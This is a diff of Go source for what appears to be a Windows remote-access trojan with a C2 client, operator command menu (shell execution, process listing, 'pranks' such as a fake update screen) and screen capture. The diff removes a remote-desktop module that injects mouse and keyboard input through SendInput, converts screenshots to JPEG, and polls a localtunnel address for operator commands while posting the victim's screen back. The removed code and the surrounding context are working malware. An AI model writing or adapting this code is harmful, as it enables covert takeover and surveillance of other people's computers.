@@ -13,9 +13,6 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
-	"image"
-	"image/color"
-	"image/jpeg"
 	"io"
 	mrand "math/rand"
 	"net"
@@ -108,8 +105,6 @@ var (
 	pRegCloseKey               = advapi32.NewProc("RegCloseKey")
 	pRegCreateKeyExW           = advapi32.NewProc("RegCreateKeyExW")
 	pShellExecuteW             = shell32.NewProc("ShellExecuteW")
-	pSetCursorPos              = user32.NewProc("SetCursorPos")
-	pSendInput                 = user32.NewProc("SendInput")
 )
 
 // ================================================================
@@ -136,47 +131,11 @@ const (
 	MB_OK              = 0x00000000
 	MB_ICONWARNING     = 0x00000030
 
-	// SendInput constants
-	INPUT_MOUSE             = 0
-	INPUT_KEYBOARD          = 1
-	MOUSEEVENTF_LEFTDOWN    = 0x0002
-	MOUSEEVENTF_LEFTUP      = 0x0004
-	MOUSEEVENTF_RIGHTDOWN   = 0x0008
-	MOUSEEVENTF_RIGHTUP     = 0x0010
-	MOUSEEVENTF_MIDDLEDOWN  = 0x0020
-	MOUSEEVENTF_MIDDLEUP    = 0x0040
-	MOUSEEVENTF_WHEEL       = 0x0800
-	KEYEVENTF_EXTENDEDKEY   = 0x0001
-	KEYEVENTF_UNICODE       = 0x0004
-	KEYEVENTF_KEYUP_SEND    = 0x0002
 )
 
 // ================================================================
 // NATIVE STRUCTS
 // ================================================================
-
-// SendInput mouse input (matches Win32 INPUT struct with MOUSEINPUT union)
-type mouseInputW struct {
-	InputType uint32
-	Dx        int32
-	Dy        int32
-	MouseData uint32
-	DwFlags   uint32
-	Time      uint32
-	ExtraInfo uintptr
-	_pad      [8]byte
-}
-
-// SendInput keyboard input (matches Win32 INPUT struct with KEYBDINPUT union)
-type keybdInputW struct {
-	InputType   uint32
-	WVk         uint16
-	WScan       uint16
-	DwFlags     uint32
-	Time        uint32
-	DwExtraInfo uintptr
-	_pad        [8]byte
-}
 
 type processEntry32 struct {
 	Size            uint32
@@ -992,269 +951,6 @@ func captureScreen() ([]byte, error) {
 	binary.Write(&buf, binary.LittleEndian, uint32(0))
 	buf.Write(pixels)
 	return buf.Bytes(), nil
-}
-
-// ================================================================
-// VNC — INPUT SIMULATION
-// ================================================================
-
-func vncMoveMouse(x, y int) {
-	pSetCursorPos.Call(uintptr(x), uintptr(y))
-}
-
-func vncMouseDown(button string) {
-	var flags uint32
-	switch button {
-	case "right":
-		flags = MOUSEEVENTF_RIGHTDOWN
-	case "middle":
-		flags = MOUSEEVENTF_MIDDLEDOWN
-	default:
-		flags = MOUSEEVENTF_LEFTDOWN
-	}
-	input := mouseInputW{InputType: INPUT_MOUSE, DwFlags: flags}
-	pSendInput.Call(1, uintptr(unsafe.Pointer(&input)), unsafe.Sizeof(input))
-}
-
-func vncMouseUp(button string) {
-	var flags uint32
-	switch button {
-	case "right":
-		flags = MOUSEEVENTF_RIGHTUP
-	case "middle":
-		flags = MOUSEEVENTF_MIDDLEUP
-	default:
-		flags = MOUSEEVENTF_LEFTUP
-	}
-	input := mouseInputW{InputType: INPUT_MOUSE, DwFlags: flags}
-	pSendInput.Call(1, uintptr(unsafe.Pointer(&input)), unsafe.Sizeof(input))
-}
-
-func vncClick(button string, double bool) {
-	vncMouseDown(button)
-	time.Sleep(10 * time.Millisecond)
-	vncMouseUp(button)
-	if double {
-		time.Sleep(50 * time.Millisecond)
-		vncMouseDown(button)
-		time.Sleep(10 * time.Millisecond)
-		vncMouseUp(button)
-	}
-}
-
-func vncScroll(delta int) {
-	input := mouseInputW{InputType: INPUT_MOUSE, DwFlags: MOUSEEVENTF_WHEEL, MouseData: uint32(delta)}
-	pSendInput.Call(1, uintptr(unsafe.Pointer(&input)), unsafe.Sizeof(input))
-}
-
-func vncTypeText(text string) {
-	for _, r := range text {
-		// Key down
-		down := keybdInputW{InputType: INPUT_KEYBOARD, WScan: uint16(r), DwFlags: KEYEVENTF_UNICODE}
-		pSendInput.Call(1, uintptr(unsafe.Pointer(&down)), unsafe.Sizeof(down))
-		// Key up
-		up := keybdInputW{InputType: INPUT_KEYBOARD, WScan: uint16(r), DwFlags: KEYEVENTF_UNICODE | KEYEVENTF_KEYUP_SEND}
-		pSendInput.Call(1, uintptr(unsafe.Pointer(&up)), unsafe.Sizeof(up))
-		time.Sleep(5 * time.Millisecond)
-	}
-}
-
-func vncPressKey(vk int, modifiers []int) {
-	// Press modifiers
-	for _, mod := range modifiers {
-		down := keybdInputW{InputType: INPUT_KEYBOARD, WVk: uint16(mod)}
-		pSendInput.Call(1, uintptr(unsafe.Pointer(&down)), unsafe.Sizeof(down))
-	}
-	// Press key
-	down := keybdInputW{InputType: INPUT_KEYBOARD, WVk: uint16(vk)}
-	pSendInput.Call(1, uintptr(unsafe.Pointer(&down)), unsafe.Sizeof(down))
-	time.Sleep(10 * time.Millisecond)
-	// Release key
-	up := keybdInputW{InputType: INPUT_KEYBOARD, WVk: uint16(vk), DwFlags: KEYEVENTF_KEYUP_SEND}
-	pSendInput.Call(1, uintptr(unsafe.Pointer(&up)), unsafe.Sizeof(up))
-	// Release modifiers in reverse
-	for i := len(modifiers) - 1; i >= 0; i-- {
-		up := keybdInputW{InputType: INPUT_KEYBOARD, WVk: uint16(modifiers[i]), DwFlags: KEYEVENTF_KEYUP_SEND}
-		pSendInput.Call(1, uintptr(unsafe.Pointer(&up)), unsafe.Sizeof(up))
-	}
-}
-
-// ================================================================
-// VNC — JPEG SCREENSHOT
-// ================================================================
-
-func captureScreenJPEG(quality int, scale float64) ([]byte, error) {
-	bmpData, err := captureScreen()
-	if err != nil {
-		return nil, err
-	}
-	if len(bmpData) < 54 {
-		return nil, fmt.Errorf("invalid BMP data")
-	}
-
-	// Parse BMP header
-	width := int(binary.LittleEndian.Uint32(bmpData[18:22]))
-	height := int(binary.LittleEndian.Uint32(bmpData[22:26]))
-	if width <= 0 || height <= 0 {
-		return nil, fmt.Errorf("invalid BMP dimensions")
-	}
-
-	// Parse pixel data (24-bit BGR, bottom-up, padded rows)
-	pixelOffset := int(binary.LittleEndian.Uint32(bmpData[10:14]))
-	rowSize := (width*3 + 3) & ^3
-	pixels := bmpData[pixelOffset:]
-
-	img := image.NewRGBA(image.Rect(0, 0, width, height))
-	for y := 0; y < height; y++ {
-		srcRow := (height - 1 - y) * rowSize // BMP is bottom-up
-		for x := 0; x < width; x++ {
-			off := srcRow + x*3
-			if off+2 < len(pixels) {
-				img.SetRGBA(x, y, color.RGBA{R: pixels[off+2], G: pixels[off+1], B: pixels[off], A: 255})
-			}
-		}
-	}
-
-	// Downscale if needed
-	var finalImg image.Image = img
-	if scale < 1.0 && scale > 0 {
-		newW := int(float64(width) * scale)
-		newH := int(float64(height) * scale)
-		scaled := image.NewRGBA(image.Rect(0, 0, newW, newH))
-		for y := 0; y < newH; y++ {
-			srcY := int(float64(y) / scale)
-			for x := 0; x < newW; x++ {
-				srcX := int(float64(x) / scale)
-				scaled.Set(x, y, img.At(srcX, srcY))
-			}
-		}
-		finalImg = scaled
-	}
-
-	// Encode to JPEG
-	var buf bytes.Buffer
-	if err := jpeg.Encode(&buf, finalImg, &jpeg.Options{Quality: quality}); err != nil {
-		return nil, err
-	}
-	return buf.Bytes(), nil
-}
-
-// ================================================================
-// VNC — TUNNEL CONNECTION
-// ================================================================
-
-// ================================================================
-// VNC — AGENT CLIENT LOOP (connects to tunnel URL via direct HTTP)
-// ================================================================
-
-func vncRequest(ctx context.Context, method, url string, body io.Reader, authToken string) (*http.Request, error) {
-	req, err := http.NewRequestWithContext(ctx, method, url, body)
-	if err != nil {
-		return nil, err
-	}
-	req.Header.Set("Authorization", "Bearer "+authToken)
-	req.Header.Set("Bypass-Tunnel-Reminder", "true")
-	req.Header.Set("User-Agent", "ValTine-VNC/1.0")
-	return req, nil
-}
-
-func startVNCClient(ctx context.Context, tunnelURL string, authToken string) {
-	if tunnelURL == "" {
-		return
-	}
-
-	client := &http.Client{Timeout: 15 * time.Second}
-	baseURL := strings.TrimRight(tunnelURL, "/")
-	quality := 50
-	scale := 0.75
-
-	for {
-		select {
-		case <-ctx.Done():
-			return
-		default:
-		}
-
-		// Poll for commands
-		req, _ := vncRequest(ctx, "GET", baseURL+"/api/commands", nil, authToken)
-		resp, err := client.Do(req)
-		if err != nil {
-			time.Sleep(2 * time.Second)
-			continue
-		}
-
-		// Localtunnel reminder page returns 401 — retry after delay
-		if resp.StatusCode == 401 {
-			resp.Body.Close()
-			time.Sleep(3 * time.Second)
-			continue
-		}
-
-		var cmdResp struct {
-			Commands []struct {
-				Action    string  `json:"action"`
-				X         int     `json:"x"`
-				Y         int     `json:"y"`
-				Button    string  `json:"button"`
-				Double    bool    `json:"double"`
-				Delta     int     `json:"delta"`
-				Text      string  `json:"text"`
-				Vk        int     `json:"vk"`
-				Modifiers []int   `json:"modifiers"`
-				Quality   int     `json:"quality"`
-				Scale     float64 `json:"scale"`
-			} `json:"commands"`
-		}
-		json.NewDecoder(resp.Body).Decode(&cmdResp)
-		resp.Body.Close()
-
-		// Execute commands
-		for _, cmd := range cmdResp.Commands {
-			switch cmd.Action {
-			case "mousemove":
-				vncMoveMouse(cmd.X, cmd.Y)
-			case "mousedown":
-				vncMouseDown(cmd.Button)
-			case "mouseup":
-				vncMouseUp(cmd.Button)
-			case "click":
-				vncClick(cmd.Button, cmd.Double)
-			case "scroll":
-				vncScroll(cmd.Delta)
-			case "type":
-				vncTypeText(cmd.Text)
-			case "key":
-				vncPressKey(cmd.Vk, cmd.Modifiers)
-			case "config":
-				if cmd.Quality > 0 {
-					quality = cmd.Quality
-				}
-				if cmd.Scale > 0 {
-					scale = cmd.Scale
-				}
-			}
-		}
-
-		// Capture and send screenshot
-		jpegData, err := captureScreenJPEG(quality, scale)
-		if err == nil && len(jpegData) > 0 {
-			req, _ := vncRequest(ctx, "POST", baseURL+"/api/screenshot", bytes.NewReader(jpegData), authToken)
-			req.Header.Set("Content-Type", "image/jpeg")
-			resp, err := client.Do(req)
-			if err == nil {
-				resp.Body.Close()
-			}
-		}
-
-		// Heartbeat
-		req, _ = vncRequest(ctx, "POST", baseURL+"/api/heartbeat", nil, authToken)
-		resp, err = client.Do(req)
-		if err == nil {
-			resp.Body.Close()
-		}
-
-		time.Sleep(300 * time.Millisecond)
-	}
 }
 
 // ================================================================
@@ -2327,10 +2023,6 @@ PRANKS
   fakeupdate     - Fake Windows update screen
   soundspam      - Play all Windows sounds
 
-REMOTE DESKTOP
-  vnc_start      - Start VNC client (connects to commander via tunnel)
-  vnc_stop       - Stop VNC client
-
 CONTROL
   shell          - Execute shell command (args: cmd)
   processes      - List running processes
@@ -2598,25 +2290,6 @@ func handleCommand(c2 *C2Client, jm *JobManager, cmd Command) {
 		}
 		time.Sleep(time.Duration(args.Seconds) * time.Second)
 		result = fmt.Sprintf("Slept %d seconds", args.Seconds)
-
-	case "vnc_start":
-		var vncArgs struct {
-			TunnelURL string `json:"tunnel_url"`
-			AuthToken string `json:"auth_token"`
-		}
-		json.Unmarshal([]byte(cmd.Args), &vncArgs)
-		if vncArgs.TunnelURL == "" {
-			result = "VNC start failed — no tunnel_url provided"
-		} else {
-			jm.Start("vnc", func(ctx context.Context) {
-				startVNCClient(ctx, vncArgs.TunnelURL, vncArgs.AuthToken)
-			})
-			result = "VNC client connecting to " + vncArgs.TunnelURL
-		}
-
-	case "vnc_stop":
-		jm.Stop("vnc")
-		result = "VNC client stopped"
 
 	case "exit", "close":
 		c2.UpdateCommand(cmd.ID, "complete", "Exiting")
